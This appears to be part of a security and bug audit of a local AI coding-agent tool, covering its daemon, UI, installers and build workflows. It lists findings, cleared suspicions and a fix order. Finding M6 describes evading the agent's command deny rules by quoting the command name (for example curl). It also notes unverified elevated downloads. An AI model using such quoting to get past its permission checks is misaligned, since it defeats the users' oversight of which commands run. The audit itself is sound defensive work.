  `Store.Append` errors are discarded on paths that shape client state. The
  TUI updates its agent footer *only* from the event, so a dropped append
  leaves the footer showing the old agent while the daemon uses the new one,
  silently.
- **`internal/tui/keys.go:22-26`** — `Esc` is a no-op whenever `m.waiting` is
  false, including when the daemon does have a turn running (resume never sets
  `waiting`, and another client's turn can clear it). Output streams in and
  Esc does nothing; the "esc to cancel" hint is hidden too.

- **`internal/daemon/static/js/events.js:130-135`** — tool rows are orphaned in
  the `running` state on cancel: the daemon never emits `tool.end` for the
  in-flight call, so the row keeps its spinner and the literal `running…` text
  forever, directly under a `[cancelled]` line, and the `toolRows` entry leaks
  until the session is switched.
- **`build/package-msi.sh:68-69`** — the WebView2 bootstrapper is downloaded
  with no integrity check and embedded into a per-machine installer that runs
  it elevated. Every other downloaded artifact in the project is SHA-256
  pinned (`internal/dictation/download.go`); this is the exception, and it is
  the one that runs elevated on end-user machines.
- **`build/package-msi.sh:37`** — `SHERPA_DIR` is computed from `$3` before
  `$3` is validated, so the helpful "need a path to a built localcode-gui.exe"
  error at line 52 is unreachable. `make dist-msi` without `GUI_EXE=` dies
  with a misleading "sherpa-onnx-c-api.dll not found" instead.
- **`Makefile:61` + `build/package-windows.sh:18`** — `dist-windows` does
  `rm -rf "$OUT"` on the same directory `dist-msi` writes into, so `make -j
  dist` can delete a just-built MSI, and re-running `dist-windows` after
  `dist-msi` silently removes the installer.
- **`.github/workflows/whisper-macos.yml:35`** — the `ref` input is
  unvalidated, contradicting the file's own "pinned upstream tag" comment: a
  dispatch can build from any branch or commit and upload it under the trusted
  artifact name that `localcode dictation` later executes.

---

## Checked and cleared

These were suspected and traced to be **safe** — recorded so they aren't
re-investigated:

- **Every other XSS sink in the Web UI** — every `innerHTML` write in `js/`
  assigns a constant literal; there is zero interpolation of daemon data into
  HTML outside `markdown.js`. Session titles, workspace paths, MCP server
  names, tool names/args/output, permission rule text, task agent names and
  error strings all reach the DOM via `textContent`/`.title`/`.value`/
  `createTextNode`. `format.js escapeHtml` escapes `& < > " '`, complete for
  text nodes and quoted attributes alike.
- **Session switching does not duplicate the transcript** — `selectSession`
  calls `clearTranscript()` before `connectEvents()`, and `clearTranscript`
  also clears `toolRows` and `sentPlaceholders`. The leaks in M18/M19 and the
  tool-row minor are *within* a session, not across one.
- **`dictation.js` chunk pipeline** — the `const session = live` pin plus
  `live !== session` re-checks after every await is correct, uploads are
  serialized so chunks cannot arrive out of order, and mic tracks are stopped
  before the tail flush.
- **Web UI double-send** — `setWaiting(true)` and clearing the input both
  happen before any await, so a second Enter cannot re-send the same text.
- **MSI custom-action sequencing** — `SetPersonalDesktop` before
  `CostFinalize` and `SetDictationExe` after it are both right; the
  property-sourced (not FileKey-sourced) dictation actions correctly avoid
  error 2753 on uninstall; `RemoveDictationModel` runs before `RemoveFiles`;
  the upgrade guard is correct. Each is backed by a `verify_msi` assertion,
  and `verify_msi` genuinely fails the build.
- **`scripts/release-preflight.sh`** — fails closed on a stale CHANGELOG
  heading, a leftover `## Unreleased`, and broken doc links (including a
  missing `python3`), and `dist` really does depend on it.
- **`package-mac.sh` / `package-mac-gui.sh`** — `lipo`, `tar -C`, and the
  `CFBundleExecutable` ↔ launcher pairing are consistent; the quoted vs
  unquoted heredocs are each the right way round.
- **`gui-windows.yml` version stamping** — `$env:LC_VERSION` is correct pwsh,
  `fetch-depth: 0` makes `git describe` meaningful, and the explicit
  `dev`/empty assertion is a real guard against shipping an unstamped binary.
- **Markdown renderer XSS** (`static/js/markdown.js`) — verified directly with
  the real renderer. `<img onerror>`, `<script>`, `javascript:` links, and
  attribute-breakout via a `"` in a link URL are all escaped (raw text is
  escaped in step 2 before any markup is introduced; the link regex only
  accepts `https?://` and the `"` is already `&quot;` by the time `inline`
  runs). Code spans and fenced blocks round-trip correctly.
- **Upload path traversal** (`internal/daemon/uploads.go`) — filename is
  `filepath.Base`'d and `.`/`..` rejected; the session-`id` path segment is
  gated by `Store.Get(id)` succeeding, so a traversal id isn't a real session
  and 404s before any path is built.
- **Client SSE reconnect** (`internal/client/client.go:320-342`) — has a 1s
  backoff (`time.After(time.Second)`), not a tight loop on a dead daemon.
- **Session subscriber fan-out** (`Append`/`Broadcast`/`Subscribe`) — send
  under lock, non-blocking, `markLost` via `sync.Once`; no send-on-closed
  window. (The file-write races M3/M4 are separate.)
- **SSE resume ordering** (`sse.go:50-104`) — subscribing before replaying
  `Events(since)` yields duplicates rather than gaps, and the `Seq <= lastSeq`
  filter removes them. Transient `Seq == 0` events correctly get no `id:` and
  do not move `lastSeq`. `Last-Event-ID` applies only when `?since=` is
  absent.
- **The lost-channel contract** — `case <-lost: return` ends the response,
  every exit path unsubscribes, and `unsub` closes the channel under the same
  lock `Append` sends under: no send-on-closed window, no goroutine or fd leak
  per disconnect.
- **`turnTracker`** — folding "busy" into "has a cancel registered" is sound;
  `finishOrTake` closes the inject/finish window under one lock; `cancel`
  drops the pending queue; the turn context is rooted at `Background()` so an
  HTTP disconnect cannot kill a turn.
- **`client.StreamEvents` resume arithmetic** — `last` advances only on
  `Seq > 0`, so a transient event cannot rewind the resume point; both selects
  honour `ctx.Done()`; the response body is closed on cancellation.
- **TUI transcript/viewport** — `appendEntry` is the single mutation point and
  `transcriptRev` is bumped on both the append and the in-place delta
  concatenation; `AtBottom()` is snapshotted so a scrolled-up reader keeps
  position.
- **TUI command queueing** — slash commands and `exit`/`:q` are excluded, so a
  dequeued entry can never be replayed as literal chat text.
- **Usage/TPS accounting** — internally consistent; `rehydrateUsage` matches the
  live path one-for-one including compaction billing.
- **`takeInjected` / injected-message rehydration** — round-trips in both event
  orderings.
- **config load/merge/rawfile** — every field merged (guarded by
  `TestMergeFieldsGuard`), unknown keys preserved with atomic temp+rename at
  0600, runtime-mutated fields consistently behind their mutexes.
- **credentials / awssso device flow** — 0600/0700, nothing logged (except the
  expiry item above).
- **`childproc.Hide`** — correct (`CREATE_NO_WINDOW` + `HideWindow`, nil-guarded,
  no-op off Windows).
- **`rules.go` `@import`** — skipped inside code spans, depth-capped, missing
  file degrades to literal; no attacker-controlled expansion.
- **`globMatch`** — two-pointer wildcard walk verified correct.
- **VAD `feed(nil)`, `forced` reset, utterance-generation, partial-frame
  carryover** — all traced sound.
- **Download / engine checksums and archive traversal** (`safeJoin`,
  base-name-only zip) — pinned, verified before placement, traversal-safe.

---

## Recommended order

1. ~~**C1**~~ and ~~**C2 / C3 / C4**~~ — done.
2. **M6** — shares C1's root cause and is *not* fixed by it: a deny rule is
   still evadable by quoting (`"curl" …`, `cu''rl …`), because matching is a
   glob against text that still contains the quotes. Normally that weakens a
   deny to an `ask`; **with `skip_permissions` on it becomes an `allow`**, so
   an explicitly denied command runs unprompted. Needs unquoting/normalization
   before matching, which C1's parse fix does not provide.
3. ~~**C5 / C6 / C7**~~ — done.
4. **M1** (dictation lock-up) and **M5** (MCP token leak).
5. **M18 / M19 / M20** — the Web UI ones a user meets in ordinary use: a
   duplicated row every time you type during a final answer, a transcript that
   lies about delivered text, and Escape/Tab silently dying for the rest of the
   page's life.
6. **M3 / M4** (log truncation + unordered/racy writes) — data integrity.
7. The rest as capacity allows.

## Note on completeness

All eight areas are now reviewed; the two that were cut short by an account
session limit in the first pass were re-run and are folded in above.

Everything here was traced end-to-end by its reviewer. The items labelled
*verified directly* were additionally reproduced by the author against the
real code, which is worth doing before acting on any of them — in the first
pass one reviewer's headline claim did not survive that check. Two claims in
this pass were self-corrected by their reviewer for the same reason (the
markdown placeholder tokens, whose control characters are invisible in a plain
file read).

Totals: **0 critical open**, **1 major open** — M11's session-scoping, declined with a reason above. M8 was not a bug. Everything else is fixed. 29 minor remain unreviewed.

## What verification changed

Six major items were re-checked against the code before any of them was
fixed, because this document's own note says a headline claim did not
survive that check in the first pass. One of the six was wrong in the
same way (M13's "no cancel command"), and one was overstated (M1 blocks
only on committing an utterance, not on every partial). A second round of
four found one more wrong claim (M4's fd reuse, disproved by measurement)
and one understated (M3 was worse than described). A third round of fourteen found one
item that was no longer a bug at all (M8, closed by the C2 fix) and one
whose stated fix does not work as written (M25 — wixl rejects it). Every
major finding has now been checked against the code. Treat each as a lead until a test
fails on it: the cost is near zero, since a fix needs a test anyway, and
a test that passes on the first run means the item was not a bug.
